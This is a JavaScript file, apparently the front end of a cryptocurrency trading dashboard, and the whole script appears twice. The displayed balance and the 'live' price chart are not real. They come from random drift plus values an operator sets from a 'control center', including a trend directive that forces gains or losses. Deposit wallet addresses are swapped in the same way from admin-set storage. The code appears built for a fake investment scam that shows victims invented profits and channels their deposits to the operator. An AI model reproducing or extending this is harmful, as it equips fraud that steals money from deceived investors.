document.addEventListener('DOMContentLoaded', () => {
    console.log("Dampened Real-Time Analytics Engine active.");

    // Load initial setup configurations
    let baselineBalance = 600.00;
    try {
        const cached = localStorage.getItem('admin_balance');
        if (cached) baselineBalance = parseFloat(cached);
    } catch (e) {
        console.error(e);
    }

    let liveValue = baselineBalance;
    let baselineRefTick = liveValue;

    // Create a highly smooth tracking dataset array for the chart
    let trackingDataset = Array(12).fill(baselineBalance).map((val, i) => val + (i - 6) * (Math.random() * 0.40));

    // UI elements sync
    function pushLiveUpdates(isBullish) {
        const targetText = document.getElementById('balance-display');
        if (targetText) {
            targetText.innerText = '$' + liveValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            targetText.style.color = isBullish ? '#10b981' : '#ef4444';
        }
    }
    pushLiveUpdates(true);

    let mainChartRef = null;
    const canvasElement = document.getElementById('LivePerformanceChart');

    function drawStabilizedChart(isBullish) {
        if (!canvasElement || typeof Chart === 'undefined') return;

        if (mainChartRef) {
            mainChartRef.destroy();
        }

        const renderCtx = canvasElement.getContext('2d');
        const fillGradient = renderCtx.createLinearGradient(0, 0, 0, canvasElement.clientHeight || 240);
        
        let primaryThemeColor = '#10b981'; // Upward Green
        if (!isBullish) {
            primaryThemeColor = '#ef4444'; // Downward Red
            fillGradient.addColorStop(0, 'rgba(239, 68, 68, 0.10)');
            fillGradient.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
        } else {
            primaryThemeColor = '#10b981';
            fillGradient.addColorStop(0, 'rgba(16, 185, 129, 0.10)');
            fillGradient.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
        }

        const labelPlacements = trackingDataset.map((_, i) => `T-${12 - i}`);

        mainChartRef = new Chart(renderCtx, {
            type: 'line',
            data: {
                labels: labelPlacements,
                datasets: [{
                    data: [...trackingDataset],
                    borderColor: primaryThemeColor,
                    borderWidth: 2.5,
                    pointRadius: 0,
                    tension: 0.38, 
                    fill: true,
                    backgroundColor: fillGradient
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                animation: { duration: 900 }, 
                plugins: { legend: { display: false } },
                scales: {
                    x: { display: false },
                    y: {
                        grid: { color: 'rgba(51, 65, 85, 0.06)', drawBorder: false },
                        ticks: {
                            color: '#64748b',
                            font: { size: 10 },
                            callback: function(val) { return '$' + val.toFixed(2); }
                        }
                    }
                }
            }
        });
    }

    drawStabilizedChart(true);

    // Paced Low-Volatility Loop Engine (Triggers gently every 6 seconds)
    setInterval(() => {
        const performanceTrend = localStorage.getItem('chart_trend_directive') || 'stable';
        
        baselineRefTick = liveValue;
        
        let priceFluctuation = (Math.random() - 0.5) * 0.25;

        if (performanceTrend === 'upward') {
            priceFluctuation += 0.08; 
        } else if (performanceTrend === 'downward') {
            priceFluctuation -= 0.10; 
        }

        liveValue += priceFluctuation;
        if (liveValue < 0) liveValue = 0;

        const isTickBullish = liveValue >= baselineRefTick;

        trackingDataset.push(liveValue);
        trackingDataset.shift();

        pushLiveUpdates(isTickBullish);
        drawStabilizedChart(isTickBullish);
    }, 6000);

    // Function to update the deposit addresses based on storage settings
    window.syncDepositUIFromStorage = function() {
        const depositSelect = document.getElementById('depositAssetSelect');
        const addressSpan = document.getElementById('displayWalletAddress');
        if (!addressSpan) return;

        const forcedNetwork = localStorage.getItem('forced_network') || 'USDT (TRC20)';
        
        // Auto-select matching dropdown option if it exists
        if (depositSelect) {
            if (forcedNetwork.includes('USDT')) depositSelect.value = 'USDT';
            else if (forcedNetwork.includes('Bitcoin') || forcedNetwork.includes('BTC')) depositSelect.value = 'BTC';
            else if (forcedNetwork.includes('Ethereum') || forcedNetwork.includes('ETH')) depositSelect.value = 'ETH';
        }

        // Display correct customized address instantly
        if (forcedNetwork.includes('USDT')) {
            addressSpan.innerText = localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb";
        } else if (forcedNetwork.includes('Bitcoin') || forcedNetwork.includes('BTC')) {
            addressSpan.innerText = localStorage.getItem('btc_address') || "1BitcoinAddressHere";
        } else if (forcedNetwork.includes('Ethereum') || forcedNetwork.includes('ETH')) {
            addressSpan.innerText = localStorage.getItem('eth_address') || "0xEthAddressHere";
        }
    };

    // Connect Click Triggers to HTML Interface Deposit/Withdraw Overlay Modals
    const dBtn = document.getElementById('quickDepositBtn');
    const wBtn = document.getElementById('withdrawFundsBtn');

    if (dBtn) {
        dBtn.addEventListener('click', () => {
            window.syncDepositUIFromStorage();
            document.getElementById('deposit-modal').style.display = 'flex';
        });
    }

    if (wBtn) {
        wBtn.addEventListener('click', () => {
            document.getElementById('withdraw-modal').style.display = 'flex';
        });
    }

    // Shared Global Storage Synchronization (Listens to Control Center instantly)
    window.addEventListener('storage', (e) => {
        if (!e.newValue) return;

        // Balance changed from control panel
        if (e.key === 'admin_balance') {
            baselineBalance = parseFloat(e.newValue) || 600.00;
            liveValue = baselineBalance;
            baselineRefTick = liveValue;
            trackingDataset = Array(12).fill(baselineBalance);
            pushLiveUpdates(true);
            drawStabilizedChart(true);
        }
        
        // Network or specific text addresses changed from control panel
        if (e.key === 'forced_network' || e.key === 'admin_address' || e.key === 'btc_address' || e.key === 'eth_address') {
            window.syncDepositUIFromStorage();
        }
    });
});document.addEventListener('DOMContentLoaded', () => {
    console.log("Dampened Real-Time Analytics Engine active.");

    // Load initial setup configurations
    let baselineBalance = 600.00;
    try {
        const cached = localStorage.getItem('admin_balance');
        if (cached) baselineBalance = parseFloat(cached);
    } catch (e) {
        console.error(e);
    }

    let liveValue = baselineBalance;
    let baselineRefTick = liveValue;

    // Create a highly smooth tracking dataset array for the chart
    let trackingDataset = Array(12).fill(baselineBalance).map((val, i) => val + (i - 6) * (Math.random() * 0.40));

    // UI elements sync
    function pushLiveUpdates(isBullish) {
        const targetText = document.getElementById('balance-display');
        if (targetText) {
            targetText.innerText = '$' + liveValue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            targetText.style.color = isBullish ? '#10b981' : '#ef4444';
        }
    }
    pushLiveUpdates(true);

    let mainChartRef = null;
    const canvasElement = document.getElementById('LivePerformanceChart');

    function drawStabilizedChart(isBullish) {
        if (!canvasElement || typeof Chart === 'undefined') return;

        if (mainChartRef) {
            mainChartRef.destroy();
        }

        const renderCtx = canvasElement.getContext('2d');
        const fillGradient = renderCtx.createLinearGradient(0, 0, 0, canvasElement.clientHeight || 240);
        
        let primaryThemeColor = '#10b981'; // Upward Green
        if (!isBullish) {
            primaryThemeColor = '#ef4444'; // Downward Red
            fillGradient.addColorStop(0, 'rgba(239, 68, 68, 0.10)');
            fillGradient.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
        } else {
            primaryThemeColor = '#10b981';
            fillGradient.addColorStop(0, 'rgba(16, 185, 129, 0.10)');
            fillGradient.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
        }

        const labelPlacements = trackingDataset.map((_, i) => `T-${12 - i}`);

        mainChartRef = new Chart(renderCtx, {
            type: 'line',
            data: {
                labels: labelPlacements,
                datasets: [{
                    data: [...trackingDataset],
                    borderColor: primaryThemeColor,
                    borderWidth: 2.5,
                    pointRadius: 0,
                    tension: 0.38, 
                    fill: true,
                    backgroundColor: fillGradient
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                animation: { duration: 900 }, 
                plugins: { legend: { display: false } },
                scales: {
                    x: { display: false },
                    y: {
                        grid: { color: 'rgba(51, 65, 85, 0.06)', drawBorder: false },
                        ticks: {
                            color: '#64748b',
                            font: { size: 10 },
                            callback: function(val) { return '$' + val.toFixed(2); }
                        }
                    }
                }
            }
        });
    }

    drawStabilizedChart(true);

    // Paced Low-Volatility Loop Engine (Triggers gently every 6 seconds)
    setInterval(() => {
        const performanceTrend = localStorage.getItem('chart_trend_directive') || 'stable';
        
        baselineRefTick = liveValue;
        
        let priceFluctuation = (Math.random() - 0.5) * 0.25;

        if (performanceTrend === 'upward') {
            priceFluctuation += 0.08; 
        } else if (performanceTrend === 'downward') {
            priceFluctuation -= 0.10; 
        }

        liveValue += priceFluctuation;
        if (liveValue < 0) liveValue = 0;

        const isTickBullish = liveValue >= baselineRefTick;

        trackingDataset.push(liveValue);
        trackingDataset.shift();

        pushLiveUpdates(isTickBullish);
        drawStabilizedChart(isTickBullish);
    }, 6000);

    // Function to update the deposit addresses based on storage settings
    window.syncDepositUIFromStorage = function() {
        const depositSelect = document.getElementById('depositAssetSelect');
        const addressSpan = document.getElementById('displayWalletAddress');
        if (!addressSpan) return;

        const forcedNetwork = localStorage.getItem('forced_network') || 'USDT (TRC20)';
        
        // Auto-select matching dropdown option if it exists
        if (depositSelect) {
            if (forcedNetwork.includes('USDT')) depositSelect.value = 'USDT';
            else if (forcedNetwork.includes('Bitcoin') || forcedNetwork.includes('BTC')) depositSelect.value = 'BTC';
            else if (forcedNetwork.includes('Ethereum') || forcedNetwork.includes('ETH')) depositSelect.value = 'ETH';
        }

        // Display correct customized address instantly
        if (forcedNetwork.includes('USDT')) {
            addressSpan.innerText = localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb";
        } else if (forcedNetwork.includes('Bitcoin') || forcedNetwork.includes('BTC')) {
            addressSpan.innerText = localStorage.getItem('btc_address') || "1BitcoinAddressHere";
        } else if (forcedNetwork.includes('Ethereum') || forcedNetwork.includes('ETH')) {
            addressSpan.innerText = localStorage.getItem('eth_address') || "0xEthAddressHere";
        }
    };

    // Connect Click Triggers to HTML Interface Deposit/Withdraw Overlay Modals
    const dBtn = document.getElementById('quickDepositBtn');
    const wBtn = document.getElementById('withdrawFundsBtn');

    if (dBtn) {
        dBtn.addEventListener('click', () => {
            window.syncDepositUIFromStorage();
            document.getElementById('deposit-modal').style.display = 'flex';
        });
    }

    if (wBtn) {
        wBtn.addEventListener('click', () => {
            document.getElementById('withdraw-modal').style.display = 'flex';
        });
    }

    // Shared Global Storage Synchronization (Listens to Control Center instantly)
    window.addEventListener('storage', (e) => {
        if (!e.newValue) return;

        // Balance changed from control panel
        if (e.key === 'admin_balance') {
            baselineBalance = parseFloat(e.newValue) || 600.00;
            liveValue = baselineBalance;
            baselineRefTick = liveValue;
            trackingDataset = Array(12).fill(baselineBalance);
            pushLiveUpdates(true);
            drawStabilizedChart(true);
        }
        
        // Network or specific text addresses changed from control panel
        if (e.key === 'forced_network' || e.key === 'admin_address' || e.key === 'btc_address' || e.key === 'eth_address') {
            window.syncDepositUIFromStorage();
        }
    });
});
